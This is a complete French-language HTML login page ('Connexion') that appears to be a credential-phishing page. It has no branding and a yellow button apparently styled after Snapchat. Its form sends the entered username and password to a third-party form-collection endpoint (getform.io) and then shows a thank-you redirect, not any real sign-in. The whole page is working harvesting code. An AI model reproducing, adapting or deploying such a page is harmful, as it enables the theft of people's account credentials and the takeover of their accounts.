<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
  }
  .form-container {
    background: white;
    padding: 30px 40px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    width: 320px;
    text-align: center;
  }
  label {
    display: block;
    margin-top: 15px;
    font-weight: bold;
    text-align: left;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-top: 6px;
    box-sizing: border-box;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 15px;
  }
  .hint { font-size: 12px; color: #666; text-align: left; margin-top: 4px; }
  .error { color: #b00020; font-size: 13px; margin-top: 10px; display: none; text-align:left; }
  .ok { color: #0b7d2a; font-size: 13px; margin-top: 10px; display: none; text-align:left; }
  button {
    margin-top: 22px;
    width: 100%;
    padding: 12px;
    background-color: #FFFC00;
    border: none;
    font-weight: bold;
    cursor: pointer;
    border-radius: 6px;
    font-size: 16px;
    transition: background-color 0.2s ease, transform .05s ease;
  }
  button:hover { background-color: #e6e600; }
  button:active { transform: translateY(1px); }
</style>
</head>
<body>

<div class="form-container">
  <h1 style="margin:0 0 6px;">Connexion</h1>
  <p style="margin:0 0 16px; color:#666; font-size:14px"></p>

  <form id="loginForm" action="https://getform.io/f/bnlnledb" method="POST" novalidate>
    <!-- Redirige vers une page de remerciement après traitement côté Getform -->
    <input type="hidden" name="redirect" value="merci.html">

    <label for="username">Nom d’utilisateur</label>
    <input type="text" id="username" name="username" required minlength="3" placeholder="ex: monpseudo" />
    <div id="userHint" class="hint">Au moins 3 caractères.</div>

    <label for="password">Mot de passe</label>
    <input type="password" id="password" name="user_password" required minlength="6" placeholder="••••••••" />
    <div id="passHint" class="hint">Au moins 6 caractères.</div>

    <div id="msgError" class="error">Merci de corriger les champs indiqués.</div>
    <div id="msgOK" class="ok">Validation ok. Envoi en cours…</div>

    <button type="submit">Connexion</button>
  </form>
</div>

<script>
  const form = document.getElementById('loginForm');
  const username = document.getElementById('username');
  const password = document.getElementById('password');
  const msgError = document.getElementById('msgError');
  const msgOK = document.getElementById('msgOK');

  function markInvalid(input, ok) {
    input.style.borderColor = ok ? '#31a354' : '#b00020';
  }

  form.addEventListener('submit', function(e) {
    e.preventDefault(); // on gère nous-même la validation avant d'envoyer
    let valid = true;

    // Vérifs simples
    if (!username.value.trim() || username.value.trim().length < 3) {
      markInvalid(username, false);
      valid = false;
    } else {
      markInvalid(username, true);
    }

    if (!password.value || password.value.length < 6) {
      markInvalid(password, false);
      valid = false;
    } else {
      markInvalid(password, true);
    }

    if (!valid) {
      msgOK.style.display = 'none';
      msgError.style.display = 'block';
      return;
    }

    // Tout bon : on affiche un message et on soumet réellement le formulaire
    msgError.style.display = 'none';
    msgOK.style.display = 'block';

    // Soumet le formulaire à Getform (ce qui provoquera la redirection vers merci.html)
    form.submit();
  });
</script>

</body>
</html>
